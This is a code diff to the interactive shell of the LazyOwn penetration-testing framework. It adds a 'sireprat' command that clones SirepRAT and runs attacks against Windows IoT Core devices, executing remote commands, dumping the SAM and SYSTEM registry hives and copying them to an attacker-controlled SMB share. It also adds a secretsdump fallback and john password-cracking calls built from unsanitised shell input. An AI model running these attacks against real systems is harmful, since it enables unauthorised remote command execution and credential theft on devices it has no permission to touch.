@@ -19,10 +19,10 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 
 """
 
-from cmd import Cmd
+import cmd2
 from utils import *
 
-class LazyOwnShell(Cmd):
+class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
 
@@ -119,7 +119,8 @@ class LazyOwnShell(Cmd):
             scripts (list): A list of script names included in the toolkit.
             output (str): An empty string to store output or results.
         """
-        super().__init__()
+        super().__init__(self)
+        self.completekey = 'tab' 
         self.params = {
             "binary_name": "gzip",
             "api_key": None,
@@ -209,7 +210,8 @@ class LazyOwnShell(Cmd):
         :type line: str
         :return: None
         """
-        command = self.aliases.get(line, line)
+        #command = self.aliases.get(line, line)
+        command = self.aliases.get(line.raw, line.raw)
         parts = command.split(maxsplit=1)
         cmd_name = parts[0]
         cmd_args = parts[1] if len(parts) > 1 else ""
@@ -4464,8 +4466,9 @@ class LazyOwnShell(Cmd):
             print_error("wordlist must be set use set wordlist <path_to_wordlist>")
             return
         if line:
-            print_msg(f"Try sudo john hash.txt {line}")  
-            os.system(f"sudo john {hashs} {line}")
+            command = f"sudo john {hashs} {line}"
+            print_msg(command)  
+            os.system(command)
         else:
             print_msg(f"Try john {hashs} --wordlist={wordlist}")
             os.system(f"sudo john {hashs} --wordlist={wordlist}")
@@ -7158,7 +7161,7 @@ class LazyOwnShell(Cmd):
         print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
         return
 
-    def do_alias(self, line):
+    def do_aliass(self, line):
         """
         Prints all configured aliases and their associated commands.
 
@@ -11753,13 +11756,18 @@ class LazyOwnShell(Cmd):
         url = self.params["url"]
         rhost = self.params["rhost"]
         dominio = get_domain(url)
-        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
 
         path_cred = "sessions/credentials.txt"        
        
         if not os.path.exists(path_cred):
-            username = input("    [!] Username: ").strip()
-            password = input("    [!] Password: ").strip()
+            if os.path.exists("sessions/SYSTEM"):
+                command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL"
+                print_msg(f"Executing command: {command}")
+
+                os.system(command)
+                return
+            else:
+                print_error("You need credentials.txt or SAM and SYSTEM files")
         else:
             with open(path_cred, "r") as file:
                 for file_line in file:
@@ -11770,6 +11778,7 @@ class LazyOwnShell(Cmd):
                         username = line
                     password = params[1].replace("\n", "")
 
+        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
         ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
 
         command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
@@ -15185,6 +15194,154 @@ class LazyOwnShell(Cmd):
             print_error("Wrong choice")
         print_msg(f"Odat command executed: odat_command")
         return
+
+    def do_sireprat(self, line):
+        """
+        Command sireprat: Automates the setup and usage of SirepRAT to perform various attacks on a Windows IoT Core device.
+
+        This function performs the following tasks:
+        1. Installs required dependencies and sets up SirepRAT if not already installed.
+        2. Prompts the user to select from predefined attacks, including retrieving system information, executing commands, saving registry keys, and copying files.
+        3. Executes the selected attack on the target device, using the remote host IP stored in self.params["rhost"].
+
+        Args:
+            line (str): Optional argument for specifying attack type directly.
+
+        Returns:
+            None
+
+        Example:
+            sireprat
+        """
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        sireprat_repo = "https://github.com/SafeBreach-Labs/SirepRAT.git"
+        sireprat_dir = os.path.join(os.getcwd(), "external/.exploit/SirepRAT")
+        
+        if not os.path.exists(sireprat_dir):
+            print_msg("Cloning SirepRAT repository...")
+            os.system(f"git clone {sireprat_repo} {sireprat_dir}")
+            print_msg("Installing SirepRAT requirements...")
+            os.system(f"pip install -r {sireprat_dir}/requirements.txt")
+        else:
+            print_msg("SirepRAT already installed, skipping setup.")
+        
+        attack_list = [
+            "GetSystemInformationFromDevice",
+            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c echo {{userprofile}}\"",
+            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SYSTEM C:\\SYSTEM\"",
+            "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SAM C:\\SAM\"",
+            f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SYSTEM \\\\\\\\{lhost}\\\\Public\\\\SYSTEM\"",
+            f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SAM \\\\\\\\{lhost}\\\\Public\\\\SAM\""
+        ]
+        
+        if not line:
+            print_msg("Select an attack:")
+            print_warn("0. all")
+            for i, attack in enumerate(attack_list, 1):
+                print_warn(f"{i}. {attack}")
+            
+            try:
+                selected_attack = int(input(f"    [!] Enter your choice (0-{len(attack_list)}): "))
+                if selected_attack == 0:
+                    print_msg("Executing all attacks sequentially...")
+                    for attack in attack_list:
+                        sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {attack}"
+                        print_msg(f"Running SirepRAT attack: {sireprat_command}")
+                        os.system(sireprat_command)
+                        print_msg(f"Sleeping 1 sec to continue to the next attack...")
+                        time.sleep(1)
+                elif 1 <= selected_attack <= len(attack_list):
+                    line = attack_list[selected_attack - 1]
+                else:
+                    print_error(f"Invalid choice: {len(attack_list)}.")
+                    return
+            except ValueError:
+                print_error("Enter a valid option.")
+                return
+            sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {line}"
+        
+        elif line == "all":
+            print_msg("Executing all attacks sequentially...")
+            for attack in attack_list:
+                sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {attack}"
+                print_msg(f"Running SirepRAT attack: {sireprat_command}")
+                os.system(sireprat_command)
+                print_msg(f"Sleeping 1 sec to continue to the next attack...")
+                time.sleep(1)
+            return
+        
+        else:
+            sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c {line}\""
+        
+        print_msg(f"Running SirepRAT attack: {sireprat_command}")
+        os.system(sireprat_command)
+        return
+
+    def do_createtargets(self, line):
+        """
+        Generates hosts.txt, urls.txt, domains.txt, and targets.txt from multiple JSON payload files.
+
+        This function scans the current directory for all JSON files with the format 'payload_{variable}.json',
+        and extracts the 'rhost', 'url', 'domain', and 'subdomain' fields from each file. It then writes these values into
+        four separate text files: 'hosts.txt', 'urls.txt', 'domains.txt', and 'targets.txt'. The 'targets.txt' file contains
+        the domain and subdomain in the format '{subdomain}.{domain}' and '{subdomain}.{url}', with domains cleaned using
+        the 'get_domain' function.
+
+        Parameters:
+        line (str): An optional argument (unused in this function).
+
+        Returns:
+        None
+        """
+        import glob
+        json_files = glob.glob("payload_*.json")
+
+        hosts = []
+        urls = []
+        domains = []
+        targets = []
+
+        for json_file in json_files:
+            try:
+                with open(json_file, 'r') as f:
+                    data = json.load(f)
+                    rhost = data['rhost']
+                    url = data['url']
+                    domain = data['domain']
+                    subdomain = data['subdomain']
+                    cleaned_domain = get_domain(domain)
+                    cleaned_url = get_domain(url)
+                    hosts.append(rhost)
+                    urls.append(url)
+                    domains.append(domain)
+                    targets.append(f"{domain}")
+                    targets.append(f"{cleaned_url}")
+                    targets.append(f"{subdomain}.{domain}")
+                    targets.append(f"{subdomain}.{cleaned_url}")
+            
+            except FileNotFoundError:
+                print_error(f"Error: {json_file} not found")
+            except KeyError as e:
+                print_error(f"Missing key {e} in {json_file}")
+
+        with open('sessions/hosts.txt', 'w') as hosts_file:
+            hosts_file.write("\n".join(hosts))
+
+        with open('sessions/urls.txt', 'w') as urls_file:
+            urls_file.write("\n".join(urls))
+
+        with open('sessions/domains.txt', 'w') as domains_file:
+            domains_file.write("\n".join(domains))
+
+        with open('sessions/targets.txt', 'w') as targets_file:
+            targets_file.write("\n".join(targets))
+        command = f"sort sessions/targets.txt | uniq > sessions/targets_clean.txt"
+        print_msg(command)
+        os.system(command)
+        print_msg("Files hosts.txt, urls.txt, domains.txt, and targets.txt have been generated.")
+        return
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
